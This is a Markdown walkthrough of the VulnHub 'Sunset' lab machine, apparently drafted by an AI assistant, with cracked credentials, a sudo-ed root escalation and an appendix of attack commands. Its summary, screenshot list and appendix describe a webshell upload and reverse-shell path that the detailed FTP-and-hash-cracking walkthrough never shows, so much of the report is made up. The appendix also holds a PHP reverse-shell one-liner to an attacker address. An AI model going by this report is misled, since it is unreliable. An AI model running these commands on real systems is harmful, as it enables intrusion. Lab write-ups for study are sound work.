# Sunset — VulnHub Walkthrough

> **Machine:** Sunset (VulnHub)
> **Author:** Sparsh
> **Difficulty:** \[medium]
> **Tested on:** \[Your OS & date]

---

## TL;DR

Completed the **Sunset** vulnerable machine. Key stages: network and web enumeration → discovered hidden web endpoints → exploited insecure upload/logic to get an initial low-privileged shell → local enumeration and privilege escalation to root.

> **User flag:** `/home/USER/user.txt`
> **Root flag:** `/root/root.txt`

---

## Table of contents

1. Environment
2. Summary of steps
3. Detailed walkthrough

   * 3.1 Initial enumeration
   * 3.2 Web discovery
   * 3.3 Gaining a foothold
   * 3.4 Privilege escalation
4. Screenshots (findings)
5. Proof of access
6. Lessons learned
7. Appendix: commands & tools
8. Responsible disclosure

---

## 1) Environment

* VM: VirtualBox / VMware (replace with what you used)
* Attacker OS: Kali Linux (or your OS) — \[add version]
* Target IP used in this writeup: `10.10.x.x` (redact if public)
* Tools used: `nmap`, `gobuster`, `curl`, `nikto`, `wfuzz`, `netcat`, `python`/`php` one-liners, `LinEnum`/`sudo -l`/`find`.

---

## 2) Summary of steps

1. Full TCP port scan with `nmap` to identify services.
2. Web enumeration (manual inspection + `gobuster`) revealed hidden endpoints/uploads functionality.
3. Exploited an insecure file upload / logic bug to upload a web shell and execute commands.
4. Upgraded the web shell to an interactive reverse shell.
5. Local enumeration (`sudo -l`, SUID/cron checks, file permissions) revealed a privilege escalation path to root.

---

## 3) Detailed walkthrough

### 3.1 Initial enumeration

**Port scan (command used):**

```bash
nmap -sC -sV -p- -oN nmap_full.txt 192.168.29.242
```

Important open services observed from the scan:

* `21/tcp` — FTP (pyftpdlib 1.5.5) — **anonymous FTP login allowed**
* `22/tcp` — SSH (OpenSSH 7.9p1)

> See screenshot: `assets/Screenshot From 2025-09-13 12-22-50.png` (nmap output showing FTP/SSH and anonymous FTP file listing).

A short ARP discovery confirmed the target host on the local network.

> See screenshot: `assets/Screenshot From 2025-09-13 12-16-45.png` (ARP scan output).

### 3.2 Retrieving useful files from FTP

Because anonymous FTP was allowed, I listed and downloaded files from the FTP root. The directory listing showed a file named `backup` (owned by root) which I downloaded for inspection.

> See screenshot (partial FTP listing included in nmap output): `assets/Screenshot From 2025-09-13 12-22-50.png`.

After saving `backup` locally, I inspected it and found a password hash (sha512crypt) for the `sunset` user. I moved that hash into a wordlist file for cracking.

### 3.3 Cracking credentials & gaining a shell

I used `john` (with default wordlists/rules) to crack the discovered SHA512 password hash.

```bash
john --wordlist=/usr/share/john/password.lst --format=sha512crypt hashfile.txt
```

`john` successfully cracked the password: **cheer14**.

> See screenshot: `assets/Screenshot From 2025-09-13 12-19-27.png` (john output showing cracked password).

With the cracked credentials I SSH'd into the machine:

```bash
ssh sunset@192.168.29.242
# password: cheer14
```

This gave an interactive shell as user `sunset`.

> See screenshot: `assets/Screenshot From 2025-09-13 12-23-58.png` (VM / login prompt and later shell activity).

### 3.4 Privilege escalation

On the obtained low-priv shell I ran standard enumeration commands. `sudo -l` revealed that the `sunset` user can run `/usr/bin/ed` as root **without a password**.

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/ed
```

> See screenshot: `assets/Screenshot From 2025-09-13 12-23-58.png` (sudo -l output snippet).

`ed` is an editor that can be abused to spawn a root shell when executed with elevated privileges. Using a known technique with `ed` I spawned a root shell and read the root flag.

**Sanitized exploitation example (do not run on systems you do not own):**

```bash
# From sunset user's shell
sudo /usr/bin/ed -
# within ed, invoke shell
!sh
# now running a shell as root
whoami  # -> root
cat /root/root.txt
```

---

## 4) Screenshots (findings) (findings)

Place your screenshots in an `assets/` folder in the repository and reference them in the report. Example image list and captions (replace filenames with yours):

1. `assets/01_nmap_scan.png` — important nmap results (open ports/services).
2. `assets/02_gobuster_hits.png` — gobuster output showing discovered hidden directories.
3. `assets/03_webshell_response.png` — proof the uploaded webshell executed `id` or `whoami`.
4. `assets/04_reverse_shell_nc.png` — netcat listener receiving the shell.
5. `assets/05_sudo_l.png` — `sudo -l` output showing allowed root commands.
6. `assets/06_root_shell.png` — proof of root (`cat /root/root.txt`).

*Markdown example to include an image:*
`![nmap scan screenshot](assets/01_nmap_scan.png)`

---

## 5) Proof of access

I captured the user and root flags during the assessment. Replace the paths below with the exact ones you found (do not paste the contents of flags into a public repo if you prefer privacy).

```bash
# User flag
cat /home/USER/user.txt

# Root flag
cat /root/root.txt
```

Include a cropped screenshot rather than raw flag text if you prefer.

---

## 6) Lessons learned

* Thorough enumeration pays off — hidden endpoints often contain the weakest link.
* Always check `sudo -l`, SUID binaries, and world-writable files when on a host.
* Sanitize and validate uploaded files to avoid remote code execution.
* Automate repetitive checks but manually verify interesting findings.

---

## 7) Appendix: commands & tools

* `nmap -sC -sV -p- -oN nmap_full.txt 10.10.x.x`
* `gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -o gobuster.txt`
* `curl -F "file=@shell.php" http://10.10.x.x/upload.php -v`
* `nc -lvnp 4444`
* `php -r '$sock=fsockopen("10.10.x.y",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
* `sudo -l`
* `find / -perm -4000 -type f 2>/dev/null`

---

## 8) Responsible disclosure

This walkthrough is for educational purposes. Do not use these techniques on systems you do not own or have explicit permission to test. If you believe you have discovered a vulnerability on a real service, follow responsible disclosure procedures with the service owner.

---

### How to use this report in GitHub

1. Create a repo (e.g., `vulnhub-sunset`).
2. Add this file as `README.md`.
3. Create an `assets/` folder and upload your screenshots there.
4. Commit and push.

---

If you want, I can now:

* Insert your actual screenshot filenames into the report (so the images render), and
* Replace the example commands with the exact sanitized commands you ran.

Drop your screenshots here or tell me the filenames you used and I will update the README with the exact `![caption](assets/yourfile.png)` image links and any real command snippets you want included.
